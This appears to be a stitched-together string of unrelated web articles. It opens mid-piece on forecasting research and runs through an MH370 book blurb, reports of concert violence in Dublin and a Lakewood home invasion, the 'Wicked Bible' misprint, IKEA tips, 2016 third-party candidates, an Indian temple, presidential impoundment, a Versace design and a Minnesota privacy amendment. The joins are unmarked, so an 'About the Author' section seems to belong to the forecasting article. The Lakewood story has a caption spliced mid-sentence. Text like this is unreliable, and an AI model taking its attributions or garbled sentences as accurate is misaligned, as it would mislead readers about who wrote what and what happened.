Yet research suggests that you could come to more accurate predictions if you instead take a step back and simply look at past historical data. So in the case of Mugabe, you might consider how long the average dictator clings to power, before refining your estimate. Other strategies were aimed at reducing known cognitive biases. For instance, research has shown people tend to make better decisions if they are reminded of common pitfalls, such as the tendency to exaggerate the risk of particularly frightening events, like a terrorist attack; they could also remember to consider both the best and worst case scenarios of a situation, since that opens the mind to the full range of possibilities and helps to question your basic assumptions about the event. These tactics may seem obvious, but all the available evidence on human irrationality suggests they are easily forgotten – even by those who should know better.
Tetlock is also looking into ways to exploit the forecasters' collective intelligence. Many psychologists believe that experts working in teams perform worse than those working individually, since they soon become “yes men” who reinforce each other's biases. “It becomes the madness of the crowds,” says Tetlock. But with some training on how to critique others' views, and respond positively to alternative viewpoints, the participants achieved the best results when they were allowed to cooperate more actively.
Ultimately, the team hope these discoveries could change the way governments make decisions. “It's not about the business of prophecy – it's the business of clarity,” he says. “We want to increase the intellectual honesty of predictions.”
The ongoing tournament could also help to highlight ways that all of us can boost our forecasting skills in everyday life. Need to make a major decision about your future? Embrace uncertainty and identify your biases. Of course, if you're a super-forecaster already, you probably saw that advice coming.

About the Author
Where's MH370? was created by Mathew Carpenter over the course of 8 months, and is finally ready to be officially launched. It is an attempt at creating a book that both informs and entertains readers, helps out the authorities by encouraging a crowdsourced search in locations that many would not suspect the plane to be and also opens up a discussion about the possible resting place of MH370. With scene locations, Mat hasn't ruled anything out.
For example, two of the locations are North Korea and Hell (or was that one location). Mat created this book because he wants answers as to why we haven't considered some of these highly potential places as part of the official search. Mat enjoyed every second of creating this book and is fully aware that if a God does exist, he's got a one way ticket to hell. What do you think of "Where's MH370"? Let Mat know by getting in touch using one of the following links:
What really happened in the Phoenix Park last weekend? We detail the events that marked a new low in Ireland's relationship with drink, drugs and casual violence
FROM EARLY morning, Dublin's Phoenix Park was thronged with cyclists, runners and families visiting the zoo.
Last Saturday dawned clear and sunny, a rare good day in a damp summer and a welcome contrast to the deluge of the night before.
It seemed like an ordinary summer day, except for the groups of young people who started arriving at about mid-morning.
The five-act gig headlined by Swedish House Mafia wasn't due to start in the park until mid-afternoon but the first fans were already on the move.
They came toting carrier bags filled with drink cans and bottles; many had already broken into their stash and were discarding the empties.
Residents by the North Circular Road entrance to the park reported groups of youths pushing supermarket trolleys filled with drink. Over at the Chapelizod gate, gangs of youths started passing through the village from 11am, according to Cathy Norris, secretary of the local Tidy Towns committee.
Many tried to access the park by the pedestrian turnstile but became frustrated when they found it boarded up. Most were drinking and smashed their bottles against hall doors and garden walls when they were empty. Just one member of the Garda was on duty in the village, she says.
North of the park, the Halfway House pub on the Navan Road was doing a good trade, having erected a tent in order to sell drink in its car-park. It was selling cans of beer and cider for €2.50.
At the main gate to the park, on Chesterfield Avenue, four gardaí were stationed to oversee the arrival of thousands of concert-goers disgorged from shuttle buses from the city centre, which started operating at about 2pm.
Other fans arrived on foot up the quays, drinking naggins of vodka or transferring alcohol into plastic bottles before the security checks. The steps of the Criminal Courts complex nearby couldn't be seen because of the surfeit of bottles.
Paul McQuaid, who runs the bike-rental shop at this entrance to the park, says he had never seen so many underage drinkers in his life. The kids coming off the buses were “lorrying into” full bottles of wine and vodka before they were confiscated, he says.
Large bins put in place to collect the empties were full long before the gig even started.
With the gates to the gig due to open at 3pm, the atmosphere across the park had already turned nasty. Fights started breaking out, while other young people passed out from their excesses.
Small children were pushed off their bicycles and drugs were being openly touted. Hopelessly outnumbered, the small number of gardaí on duty could do little to control events.
The gig was sold out, all 45,000 tickets, but it was clear that many young people had come without tickets. Some may have wanted to stay drinking in the park; others may have intended crashing the event.
The first act, Calvin Harris, was due on only 15 minutes after the gates opened. This left little time for people to enter the concert area in an orderly way, and contributed to the crush at the entrance. “The queue to get in was basically pushing and barging for 30 minutes,” one fan says. “It also would have been very easy for anyone who didn't have a ticket to get in.”
In the ensuing melee, many fans say they weren't checked on the way in. They say they could have brought in anything to the gig, and even entered without a ticket. But other fans say they were thoroughly checked, and that drink, when found, was confiscated.
Many weapons, including hammers and knives, were also confiscated, but it would become clear later that some attendees successfully smuggled drink, drugs and/or weapons into the event.
Some fans have pointed out that no sniffer dogs were present, as happens at other festivals overseas. Others said a failure to control entry using wrist bands made the event harder to control.
By now, there was trouble both inside and outside the concert area. Fans outside, in the park, were seen flinging bottles around and starting fights.
Families cowered inside the zoo to avoid the trouble, or cut through the grass to the car park, past fans urinating in full view, to make a quick exit. Drunken fans stopped by the ice-cream vans asking if they sold alcohol.
Some idea of the mayhem can be gleaned from social media sites and subsequent radio programmes. One woman saw a group of 10-15 youths fighting.
“They were jumping on top of each other, coming away with heads and faces bleeding, and their shirts ripped, I had to drive away quickly because they were landing on my car.”
“In my first five minutes there I saw a guy loaf a girl and bust her nose,” recalled one concert-goer, while another may have been describing the same incident: “The first thing I saw when got into the area was a guy punch a girl full force in the face.”
Things were particularly fraught during breaks between acts. An ambulance worker*, whose group treated more than 100 fans, said bottles were being thrown into the air or smashed over people's heads.
One fan witnessed two young men slashing each other with broken naggin bottles, and another a fight between two girls.
YouTube footage shows images of bare-chested, bellicose youths kicking and punching each other in a bath of mud, while others join in on a whim. There is little evidence of meaningful intervention by security personnel.
“One man that was pushed, pulled out mace from his pocket and sprayed it in another man's eyes in front of the whole crowd,” said concert-goer Sinéad Doyle. “It was horrible. At this point I decided it was way too dangerous and I wasn't comfortable and decided to leave the concert.”
Large numbers of fans were described as being “out of their heads”. One group was seen using coins to scoop up cocaine from a tennis-ball-sized bag of powder; another used keys to deliver their hit.
Fans reported being offered ketamine and other pills of various hues. Some of the product on offer was new to Dublin, and was being sold under names such as “ghost” and “death”.
Large queues formed at the women's toilets, leading to outbreaks of aggression.
A pregnant woman had drink thrown over her, while an attempt was made to overturn a Portaloo while it was occupied. Impatient fans kicked in the door of another toilet which was occupied by a couple for a long time.
The musicians on stage seemed unaware of the mayhem occurring among the audience and many fans said they were unaware of the violence or were successfully able to steer clear of it. Of those who witnessed violence, many avoided it and had a good time.
The on-site bars, which had been serving Heineken, wine and water, closed at 10pm. This area was well staffed by security, according to those present, and was largely free of queues.
Despite the subsequent focus on a hard core of trouble-makers, it was clear that the concert attracted young people from a wide variety of backgrounds and classes. However, many fans opted to leave early, some going even before the headline act.
The disorder continued as the fans dispersed before midnight, spilling out into the surrounding neighbourhoods for a time.
It took another day, however, before the full scale of the violence became apparent: two drug deaths, nine stabbings and 33 arrests leading to 70 charges.
Lee Scanlon (20), from Clonsilla, died after looking for help at the medical tent complaining of chest pains.
He was pronounced dead shortly after he was admitted to James Connolly Memorial Hospital Blanchardstown on Saturday evening.
Shane Brophy (21), from Swan, Co Laois, left the concert and died after becoming ill at a party in a friend's house in west Dublin.
Two of the stabbing victims remain in hospital and one man has been charged with a knife assault on a fan.
Concert company MCD has rejected claims of inadequate security, saying that the 511 security personnel and 145 gardaí on duty exceeded the number required under its licence.
By last Thursday, the park had been cleaned up and the worst litter that could be seen was the dung left by passing horses.
Staff continued to pick the concert site clean as work continued on dismantling the stage. The site looked like a pasture through which a herd of cattle had passed, but no worse.

Crack open a copy of the so-called Wicked Bible to Exodus 20, and you'll find a pretty standard version of the 10 Commandments, albeit with 17th-century spelling twists: “Honour thy father and thy mother, that thy dayes may bee long upon the land which the LORD thy God giveth thee. Thou shalt not kill.”
And then you hit verse 14: “Thou shalt commit adultery.”
Yeah, oops. That missing “not” is kind of important.
One of history's most titillating biblical misprints is back in the news: A copy, said to be one of about 10 left, is going on auction at Bonhams in the United Kingdom. Once the error was discovered, about a year after roughly 1,000 of the books were printed in 1631, most copies were burned, which is why they're so rare. The printers, Robert Barker and Martin Lucas, were brought to court and fined by King Charles I of England, and they lost their printing licenses. Barker later died in debtor's prison.
And: There's intrigue! As if a biblical endorsement of hanky-panky weren't enough. There's a rumor that another printer purposefully inserted the error, said Diana Severance, the director of the Dunham Bible Museum in Houston, Texas, which also has a copy of the book. The strongest evidence? “There is another error,” she said. In “Deuteronomy 5:24, when it talks about the ‘greatness' of God, it has ‘great-asse.'” The 10 Commandments appear only twice in the Bible: once in Deuteronomy 5, and again in Exodus 20, the very two places where the Wicked Bible contains errors. One could understand a dropped “not,” maybe, but “‘great-asse' is not a typical typographical error,” Severance said. “It's not just an accidental mistake.”

LAKEWOOD — Police say a suspect in a brutal and terrifying home invasion was shot by the homeowner, and he was carried off by his fellow intruders. Then his body was dumped more than 20 miles away.
In a bizarre and evolving story with suspects still on the loose, police say they received “frantic” calls from a homeowner around 9:30 p.m. Tuesday in the 11000 block of Briar Road Southwest in Lakewood. The man told police that he and his wife had just been robbed, and he shot one of the suspects.
Lakewood police drove to the scene and interviewed the husband and wife homeowners. According to the victims, three unknown men knocked on their door Tuesday night and forced their way inside the home. One of the suspects was armed with a handgun, and another was armed with a knife, Lakewood police said.
The suspects pistol-whipped the husband and cut the wife on the hand before tying them up. The suspects then searched the house for items to steal.
At some point during the robbery, the suspects stepped outside and the husband was able to free himself and untie his wife, police said. They shut the door and locked the suspects out before running into a back bedroom.
However, the suspects forced themselves back into the house, police said, and ran to the bedroom. The husband, who had since armed himself with a Police believe the deceased was one of the suspects in the Lakewood home invasion. handgun he kept in his room, fired two shots as the suspects barged through the door. Police said evidence from the scene suggests one of the suspects was hit by gunfire, and the suspects fled.
After police arrived at the home, the husband received treatment for cuts to his head and the wife for cuts to her hand. The injuries were relatively minor.
Hours later and with no sign of the suspects, police in Federal Way received calls of a shooting from residents at the Club Palisades apartment complex in the 2100 block of South Star Lake Road. The reporting party allegedly heard shots, saw a person fall to the ground and watched a vehicle drive away.
When Federal Way police arrived on scene, they found man in his 20s dead from gunshot wounds. Police believe the deceased was one of the suspects in the Lakewood home invasion. It is not known if he died en route from Lakewood or if he was killed –possibly by his accomplices — at the apartment complex.
Police said the other suspects in the home invasion robbery are still on the loose. They are described as black males, about 5'10” tall with a medium build. They were wearing dark clothing with knit caps and some kind of masks covering their faces during the robbery.
Major crimes detectives in both locations are investigating the crime.
Anyone with more information on the home invasion or the Federal Way shooting is encouraged to call 911.
This story will be updated as more information becomes available.
IKEA stores are enormous — depending on the store, they can range from just under 200,000 (Saint Louis, MO) to over 450,000 square feet (the soon-to-open IKEA in Burbank, CA.)
Follow these tips, and your maiden voyage to IKEA should be a snap, which is more than we can say for assembling the stuff you'll bring home:
Make a List
It's easy to get overwhelmed and distracted by shiny object syndrome if you don't set a goal, plan your trip and make a list. The Swedish retail giant offers a handy IKEA shopping list feature on its website, so you can make your list and know where in the store you'll find your stuff.
Check Stock
Before you go, check stock levels at your local store online so you can avoid the hassle of finding out IKEA is out of the item you want.
Plan Two Trips
Just wandering the store can be a fun way to get design ideas for your home, but one experienced IKEA shopper recommends you keep your inspiration trip separate from your buying trip to minimize stress.
Scout Deals and Discounts
Join the IKEA Family program, and you can get special discounts on featured items, free coffee or tea in the IKEA cafeteria and bonuses like a chance to win a $100 gift card.
Sign Up For The IKEA Moving Program
If you're moving or just moved, sign up and get $25 off a purchase of $250 or more.
Wait For The Kitchen Sale
If you're planning to install an IKEA kitchen, call the store to ask when the next kitchen sale will happen. IKEA periodically offers kitchen deals, like 15 percent back in the form of a store credit when you buy a kitchen. When I bought my IKEA kitchen, I saved 20 percent by waiting a month for a sale, then used that extra money to splurge on a quartzite countertop.
Fuel Up Properly
Make sure you get a good night's sleep and eat a light, nutritious meal before a trip to IKEA. After a few hours in the store, you'll probably get hungry. Try the IKEA cafeteria, which serves everything from coffee to salmon dinners to IKEA's famous Swedish meatballs. If you go during lunch hours, especially on a weekend, be prepared to wait in line.
Take a Deep Breath
Are you shopping with your significant other? Relax, try to keep a sense of humor and don't take the trip too seriously. Some couples have had their worst fights in IKEA, and it turns out that an “IKEA meltdown” is actually a thing.
Bring the Right Company
If you and your main squeeze have really different shopping styles, it might be best to go with a pal who's more your speed. I only go to IKEA with my husband when we've got a specific item to buy because he would hate to spend five hours of browsing weird kitchen gadgets, textiles and garden gear.
Go On a Weekday
When I was in the midst of planning my IKEA kitchen, I once asked a harried IKEA employee what day of the week was least busy, and he told me Tuesday. However, you should be fine making your first trip any weekday when most people are at work, except maybe Friday afternoon.
Avoid Saturdays
The worst day for a newbie to visit is definitely a Saturday, unless you love being pushed along by throngs of shoppers, dodging triple-wide strollers, and standing in line for 30 minutes to get lunch.
Know The Layout
An IKEA store is set up like a giant maze — you go in and travel through showroom after showroom until finally, maybe hours later, you reach the checkout area and finally the store exit. Study the store map before you go and take note of the many shortcuts you can use to navigate the store.
Control Your Impulses
The IKEA store layout is intentionally designed to be confusing to zap shopper willpower and make you more likely to succumb to impulse purchases. So, remember that before you throw that LATTJO Brain Hat or that GULLHOLMEN banana fiber rocking chair into your cart.
Don't Expect Stellar Customer Service
The IKEA business model relies heavily on self-service, which helps keep IKEA stuff dirt cheap. The store is designed to be easy to navigate so ideally you never have to track down an IKEA employee — also known as an IKEAN — to ask for help. If you do need to assistance, don't expect getting it to be easy or quick, especially on a Saturday.
Be Ready for Assembly
If you're buying anything bigger or more complicated than a set of plates or a soap dispenser, be prepared for assembly, IKEA-style. The wordless IKEA assembly instructions consist of mysterious drawings and no words. If squinting at instructions and wielding allen wrenches isn't your thing, you can always hire out your IKEA assembly, though it's not cheap.

Gary Johnson's governorship of New Mexico in the 1990s coincided with Mike Layne's college years in Santa Fe.
Today, Layne's front yard in Redlands features a Johnson campaign sign. Layne, a 47-year-old consultant who helps nonprofit groups, cities and schools pursue grant funding, is drawn to Johnson's mix of fiscal conservatism and social liberalism.
“I think that's what we're missing from the candidates. They're either left of center or right of center,” said Layne, a former Redlands City Council candidate who is not registered with a political party. “You used to be able to be socially liberal in the Republican Party, and they ran those people out several years ago.”
With this year's presidential race featuring a matchup between two unpopular major party candidates, supporters of Libertarian Johnson and Green Party presidential candidate Jill Stein see a golden opportunity to loosen the Republican and Democratic parties' stranglehold on political power.
“This is an opportunity that just does not happen,” said Jim Gray, a retired Orange County judge who was the 2012 Libertarian Party vice presidential nominee. “It's a perfect storm for us with regard to the candidates for the Democrats and the Republicans, but it's very scary for the country.”
As of Wednesday, an average of recent polls showed Johnson and Stein with 8.4 percent and 3.2 percent of the vote, respectively, according to the polling website RealClearPolitics, which gave Democrat Hillary Clinton a 2.1 percentage point edge over Republican Donald Trump.
A Field Poll from July shows Johnson at 10 percent in California, with Clinton leading Trump by 24 percentage points here. Clinton is widely expected to win California's 55 electoral votes in the November general election.
This year's race for the White House is unusual given voters' general dislike of Clinton and Trump. RealClearPolitics as of Wednesday reported a minus-13.9 percent favorability rating for Clinton, who has been dogged by questions about her email practices and the Clinton Foundation charity, and a minus-21.5 favorability rating for Trump, who has been condemned by critics as an offensive narcissist who caters to white supremacists.
Johnson, who was a Republican while governor, supports positions appealing to conservatives, including a balanced federal budget, cutting regulations and replacing income and payroll taxes with a sales tax.
But he departs from GOP orthodoxy in his support of marijuana legalization, abortion rights and immigration reform that emphasizes assimilating immigrants over building a border wall. On his campaign website, Johnson argues against interventionist foreign policy, saying it only creates more problems and perpetuates war.
Stein, who ran for Massachusetts governor and other offices in that state, wants to create jobs through a “Green New Deal” that would have America running entirely on clean renewable energy by 2030. She supports guaranteed access to housing, health care, food and water, a federal $15 an hour minimum wage, abolishing student loan debt and cutting military spending by at least 50 percent while closing overseas military bases.
Libertarians and Greens made up fewer than 2 percent of all registered voters in California as of June. Forty-five percent of state voters are Democrats, 27 percent are Republicans and 23 percent are not affiliated with any political party.
‘REAL CHANCE'
Jack Pitney, a professor of politics at Claremont McKenna College, agrees that this election cycle offers hope for Greens and Libertarians long confined to the political sidelines. “Johnson probably has greater potential,” he said.
“Neither Stein nor Johnson is going to win in 2016; the two-party system is too deeply entrenched,” Pitney said. “But the Trump candidacy has severely damaged the GOP's reputation, and many limited-government types will be looking for a new political home.”
“And if Clinton wins and disappoints progressives – a very real possibility – the Greens will have a real chance at growth.”
But Pitney also sees obstacles for Stein and Johnson.
“Stein can appeal to Bernie Sanders Democrats who think that Hillary Clinton is too close to business interests,” he said. “One big problem, however, is the memory of Ralph Nader. In 2000, Nader took enough votes from (Al) Gore to tip the state of Florida – along with the presidency – to George W. Bush. That memory is a huge burden for any Green candidate.”
Stein, a physician, has waffled on the issue of vaccination, Pitney said. While Stein told The Washington Post that vaccines have been “absolutely critical” in preventing diseases such as smallpox, Stein also has been quoted as saying there are “real questions” about vaccine safety.
“To be credible, Stein has to shift the focus away from such issues and emphasize bread-and-butter concerns such as economic inequality,” Pitney said.
With Johnson and his running mate, former Massachusetts Gov. Bill Weld, “the Libertarians are in the unusual position of offering a presidential and vice presidential candidate who both have real governing experience,” Pitney said.
“But to break through to the public and make a bigger dent in the Trump vote, (Johnson) needs some high-profile endorsements. If Jeb Bush and Mitt Romney got behind him, he might be able to pick up the few additional points he needs to meet the debate threshold.”
Johnson hopes to break the 15-percent polling threshold needed to participate in the upcoming presidential debates. The first one is Sept. 26 at Hofstra University in Hempstead, N.Y.
Getting into the debates is crucial for Johnson, said Gray, who was Johnson's running mate four years ago.
If that happens, “we will capture the voters' imagination and become the odds-on favorite to win,” Gray said. “We're asking people (if a pollster calls) to say you support Gary Johnson. Get us in the debate and it will be a game-changer.”
Johnson also will have to convince voters he's qualified, and a recent TV interview didn't help. Asked what he would do to solve the refugee crisis in Aleppo, Johnson replied: “What is Aleppo?”
The gaffe didn't faze Layne. “I would venture that 90 percent or more of registered voters could not answer the same question that Johnson was asked, and yet he is somehow now not qualified?” he said.
The Stein campaign did not respond to a request for comment.
‘MOOD IS RIGHT'
Johnson and Stein have reached out to disaffected voters in both major parties. Johnson has wooed Republicans who don't like Trump, while Stein and running mate Ajamu Baraka, a human rights activist, are trying to recruit Sanders supporters angry with Clinton and the Democratic establishment.
Andy Favor, a 52-year-old certified public accountant from Laguna Niguel, registered as a Republican to vote for then-GOP presidential hopeful Ron Paul. This time around, he has a Johnson bumper sticker on his car and has donated to Johnson's campaign.
“I hope that Republicans would realize that Trump can't win, and take a look at Johnson,” Favor said. “I think Republicans are going down with the ship.”
Christopher Cruz, a 25-year-old from Montebello who works in tech support for the Los Angeles Unified School District, thinks Stein cares more about issues facing people of color than Clinton.
“I really want communities to be aware there's another option,” Cruz said. “We grew up with hereditary politics. We saw our parents voting Democratic or Republican and we think there are only two options.”
To those who think he is wasting his vote, Cruz said: “The Democratic Party is not entitled to my vote. They're not entitled to anybody's vote. Look at the Democratic Party and look what they've done for you.”
“From my perspective, I could vote for Hillary and I might prevent some deportations from happening,” Cruz added. “But that won't stop it. It will continue to happen, just based on Obama's record. For me, I'm not comfortable with that.”
Given Clinton and Trump's unpopularity, “I think it really will push third party candidates to another level,” Cruz said.
“I really think the mood is right, the time is right, especially at the local level. The local level is where you can make a lot of change.”

Alampur Jogulamba Temple in Mahbubnagar District Telangana
Alampur Jogulamba Temple
Alampur is a small temple village located at about 90 km from Mahabubnagar, 27 km from Kurnool and 200 km from Hyderabad,in Mahbubnagar district of Telangana region of Andhra pradesh India. It was previously known as Halampur and is also the "City of Temples".It is the meeting point of two sacred rivers namely Tungabhadra and Krishna which are also known as Dakshina Kashi (also known as Navabrahmeshwara Theertha)or Sangama Kshetram along with the Srisailam, which is one of the famous Shiva pilgrimage centre. The Holiness of Alampur Temple is well mentioned in the Skanda Puranas. The predominant dieties at Alampur are Brahmeshwara and Jogulamba which are surrounded by Nallamala hills situated on the bank of Tungabhadra river. This article is regarding Jogulamba Devi.
Alampur is historically important as it is listed officially in Archaeological and Architectural Treasure in the "List of Monuments" prepared by the Archaeological Survey of India(ASI) under the The Ancient Monuments and Archaeological Sites and Remains Act,.
Legend Behind the formation of this Temple:
Once there lived a great King called Daksha Prajapati who was the son of Lord Brahma. Sati devi was one among his 27 daughters who got married to Lord Shiva. Daksha conducted a yagna in which he did not invite his daughter(Sati) and his son-in-law(Shiva). When Sati, attended the yagna she was not welcomed nor given importance, instead got insulted by the abuses of her sisters and parents towards her husband(Shiva) which she couldn't tolerate and scarified herself at the place of yagna by creating agni from earth with her right thumb of her foot. Knowing this incident Lord Shiva removed one bunch of Jhatha(hair) from his head and hit it to the earth,there Lord Veerabhadra was born who rushed to the yagna spot and killed Daksha by cutting his head. Later Shiva also went to the spot and took the body of Sati from the fire and started dancing holding her in his arms. The whole world was terrorized from this Tandava Nrithya and to stop this Nrithya, Lord Vishnu used his Sudarshan Chakra and completely cut the Sati's body into pieces. These body parts have fallen at various places in India and Srilanka. Where ever Sati's body parts have fallen the places are known as Shaktipeethas of which 18 such places are called Ashta(8) Dasha (10) Shaktipeethas.

The Shrine of Jogulamba Devi Temple:-
It is one of the Ashtadasa Shakthi Peethams (18 holy abodes of Mother Goddess) which is one of the famous Religious places situated in the town of Alampur of Telangana region in the Mahbubnagar district of Andhra Pradesh. The Jogulamba ( Yogamba ) temple is fifth Shakti Peetha where Sati Devi's upper teeth fell, when Lord Shiva was carrying the body of Sati Devi and was wandering throughout Aryavartha in sorrow. There are 51 Shakti Peethas of Goddess origined with her body parts found in particular places.
History of the Temple:
According to mythology the Daksha yagyna and Sati's self immolation is the story behind the origin of Shakti Peethas. The original temple was grounded by Muslim invaders in 1390 A.D.and later the temple was rebuilt including Sankari Devi temple in Sri Lanka, which has been reconstructed after 615 years. It was then that the local people put up a fierce resistance and killed the invaders and moved the main idol to the nearby Balabrahmeswara temple. Since then, the idol had been worshipped in the secluded place in the temple.
This temple was built by Chalukyas of Badami,who were great patrons of architecture and art and had built a number of temples in and around Alampur in the 7th and 8th centuries mainly by the initiative of Pulakesin-II.There are nine temples dedicated to Shiva as Navabrahmeswara and Jogulamba at Alampur out of which eight magnificent temples of Navabrahmeswara survived but the temple of Tarakabrahma could not be found till date. This temple was reconstructed at the same place where it stood in the same way as it was described in the 'Rasaratnakaram' of Nityanatha Sidha of 12th century AD. Sri Adi Shankaracharya was the one who installed `Sri Chakra' at Jogulamba temple, which is not available now. The Endowments Department took initiative to raise funds for reconstruction of the temple. The temples across the country donated money for the temple while Srisailam Devasthanam has adopted it to ensure uninterrupted rituals.
The word "Jogulamba" is derived from "Joginula Amma" (Mother of Joginis) and the word has different meanings like:
Jogini or Yogini or Jogulamba :- a female person, who has given up all the earthly attachments.
Yogulamba or Yogamba :- a female dancer, whose life is dedicated to God.
The idol of the goddess in the temple can be seen in a sitting posture having abundant hair on which is seen a lizard, scorpion, bat and human skull. Besides this main idol of the temple are seen Saptamatrikas (group of Hindu goddesses), Ganapathi and Veerabhadra.The original idols of Chandi and Mundi have been left by the army of Bala Brahmeshwara Swamy Temple on the other side. The Jogulamba Temple is considered the primary Shaktipeeth, where the upper teeth of Sati fell.
Alampur Jogulamba Devi
Siginificance of Jogulamba Temple:
The Goddess is well known as "Gruha Chandi" (the protector of our homes) as the Idols hair is seen with a lizard, scorpion, bat and human skull,which are the indications of evil and signs of deterioration of a house.
Some facts:
1)Lizard is the primary indication that a house is starting to lose its life(jeeva kala) as their number starts increasing resulting in the welcoming of scorpions which is even worse.
2)In the same way,the entrance of bats into the houses results in death of humans living in that house.
Hence,People of Alampur believe that Jogulamba protects them and their houses from all kinds of evils and also worship her to be freed from Vastu Doshas (faults in constructions). The temple attracts a large number of pilgrims from various parts of the country on major festivals like Dusshera and Maha Shivaratri which are celebrated with great spirit.
Once upon a time there was a Giant Shiva Linga present inside the mosque till 1970's, which people were allowed to see. Today,as the temples are renovaated and got modern structures in and around the temples,some of the ancient structures like these are not known what happened to them at the mosque as it was renovated by dargah committee during the 1990's.

The temple has a Yagnasala where Yagnas are performed, a rest house and a pond in its premises. The temples large portion of land, is built magnificently with several carvings on the black stone and flooring with marble stone.The sculptures are beautifully decorated with floral and geometrical designs which tells a story from the Hindu mythology. In the picture below, you can see a half man-half woman figure in the entrance of the temple. There is also a snake god carving (which was lying out on the street) which is supposed to have been to Paris and back for an art exhibition. There's a small museum too with a small collection of stone sculptures.

There is an ancient mosque within the temple complex has a huge "cane basket"(bowl carved out of black granite) inverted over a platform. As said by Mullah during festivals, this bowl would be filled with food and people would have handfuls out of it.

Are the 18 houses of Shakthi, which are rare even to devas.
When read in the evening,demolishes the shatrus,
Cures all types of diseases,and all is well in the life.
Among all the Shakti Peethas, the Kamkhya, Gaya and Ujjain are the most sacred which symbolize the three most important aspects of mother Goddess as in the form of Creation (Kamarupa Devi), Nourishment (Sarvamangala Devi/Mangalagauri) and Annihilation (Mahakali Devi). All these lie in a perfect straight line from Kamakhya to Ujjain via Gaya symbolizing that every creation in this universe will annihilate one day without fail. Along with Kanchi Kamakshi, Madurai Meenakshi, and Kashi Vishalakshi we are having the most potent Shat Shakthi Peethams.
On account of Basant panchami one can have the Nijarupa Darshan of the Jogulamba Devi at Alampur.

Impoundment is an act by a President of the United States of not spending money that has been appropriated by the U.S. Congress. Thomas Jefferson was the first president to exercise the power of impoundment in 1801. The power was available to all presidents up to and including Richard Nixon, and was regarded as a power inherent to the office. The Congressional Budget and Impoundment Control Act of 1974 was passed in response to perceived abuse of the power under President Nixon. Title X of the Act removed that power, and Train v. City of New York (whose facts predate the 1974 Act, but which was argued before the U.S. Supreme Court after its passage), closed potential loopholes in the 1974 Act. The president's ability to indefinitely reject congressionally approved spending was thus removed.[1]
The Impoundment Control Act of 1974 provides that the president may propose rescission of specific funds, but that rescission must be approved by both the House of Representatives and Senate within 45 days. In effect, the requirement removed the impoundment power, since Congress is not required to vote on the rescission and, in fact, has ignored the vast majority of presidential requests.[2]
Forty-three states in the U.S. give their governors authority not to spend money allocated by the state legislature. The states which deny their governor the authority are Indiana, Nevada, New Hampshire, North Carolina, Rhode Island, and Vermont.[3] The Mayor of Washington, D.C. also has the impoundment power.[4]
History [ edit ]
The term is derived from pound, a secured holding area. The general sense of impoundment is the items held in the pound, or the process of securing them into the pound. In that senses, the President is securing the pool of allocated funds, holding them instead of allowing them to be freely spent.
The first use of the power by President Thomas Jefferson involved refusal to spend $50,000 in funds appropriated for the acquisition of gunboats for the United States Navy. He said in 1803 that "[t]he sum of fifty thousand dollars appropriated by Congress for providing gun boats remains unexpended. The favorable and peaceable turn of affairs on the Mississippi rendered an immediate execution of that law unnecessary."[5] In keeping with his efforts to reduce the size of the debt, he left the funds for the ships unspent for over a year.
Many other presidents have followed Jefferson's example. From time to time, they refused to spend funds when they felt that Congress had appropriated more funds than was necessary. However, the impoundment power had limits. For example, in 1972, Richard Nixon attempted to impound funds on an environmental project which he opposed. Congress had previously overridden Nixon's veto of the project. The Supreme Court in Train v. City of New York (1975)[1] ruled that the impoundment power cannot be used to frustrate the will of Congress under such circumstances.
The Impoundment Control Act of 1974 was passed as Congress felt that President Nixon was abusing his authority to impound the funding of programs he opposed. The Act effectively removed the impoundment power of the president and required him to obtain Congressional approval if he wants to rescind specific government spending. President Nixon signed the Act with little protest because the administration was then embroiled in the Watergate scandal and unwilling to provoke Congress.[6]
However, the procedure set up by the Act was cumbersome. All recent presidents supported the restoration of the impoundment power, including Presidents Ronald Reagan, George H. W. Bush, Bill Clinton, George W. Bush, and Barack Obama. Politicians such as John McCain, John Kerry, Al Gore, Pat Buchanan, Jeb Hensarling, Russ Feingold, Joe Lieberman, Judd Gregg and Paul Ryan also supported the restoration of the power.[7]
The Line Item Veto Act of 1996 gave the president the power of line-item veto, which President Bill Clinton applied to the federal budget 82 times[8][9] before the law was struck down in 1998 by the Supreme Court on the grounds of it being in violation of the Presentment Clause of the U.S. Constitution.
Strengthening the rescission provision within the 1974 act has also been proposed as a means of curtailing excessive congressional spending.

The ‘80s and ‘90s are so in right now.
Just ask Italian fashion house Versace, which appears to have ripped off the Vancouver Canucks' old jersey design for a pricey new “printed sweatshirt” for women.
The black Versace-designed sweater features a logo with a yellow-rimmed white circle behind the word “VERSACE” written at a 45-degree angle, surrounded by black, white and yellow lines that make the shape of a skate.
It should be a very familiar design and colour scheme for Canucks fans, whose team wore virtually the same “flying skate” logo (with different lettering) from 1985-1997.
While a throwback Canucks sweater might cost you up to $200 online, Versace's version is listed at $1,260 (860 Euros). That's approaching the cost of a lower-end pair of Canucks' season tickets.
“This sweater is exactly what we'd expect a basic from Versace to be – body-hugging, sensuous design with a bold pattern emblazoned across the front,” the product description reads. “Wear yours with anything and everything – from boyfriend-cut jeans to feminine skirts.”
So female Canucks fans take note: You've got some options the next time you dust off the old jersey.
ST. PAUL, Minn. (Mar. 2, 2015) – Minnesota voters are one step closer to having an opportunity to amend their state constitution in order to reject significant parts of mass surveillance programs by both state and federal government officials.
Introduced by State Reps. Peggy Scott (R-35B), John Lesch (DFL-66B), Tony Albright (R-55B), Cindy Pugh (R-33B), Eric Lucero (R-30B), David Bly (DFL-20B), and Steve Drazkowski (R-21B), House File 327 (HF327) was giving a “do pass” recommendation by the House Government Operations and Elections Policy Committee on Feb. 23.
HF327 would give Minnesota voters the chance to amend their state constitution to read as follows (emphasis added):
The right of the people to be secure in their persons, houses, papers, and effects, and in their electronic communications and data, against unreasonable searches and seizures shall not be violated; and no warrant shall issue but upon probable cause, supported by oath or affirmation, and particularly describing the place to be searched, the person or things to be seized, and the electronic communications or data to be accessed.
If HF327 is passed by the legislature, it would bypass the Governor's desk and go directly to the voters. On the 2016 ballot, they would be asked: “Shall the Minnesota Constitution be amended so that the people are secure in their electronic communications and data from unreasonable searches and seizures as they are now likewise secure in their persons, homes, papers, and effects?”
The bill contains similar language to Missouri's Amendment 9, which was passed by voters in August of 2014. It won with an overwhelming 74 percent of Missourians voting in favor of the amendment. This demonstrates that a bipartisan consensus is emerging to rebuke warrantless surveillance of electronic data and communications.
The addition of electronic communications to the list of privacy items would make emails, phone records, Internet records and other electronic information gathered without a warrant inadmissible in state court. That would include data gathered illegally by state and local law enforcement as well as the federal government.
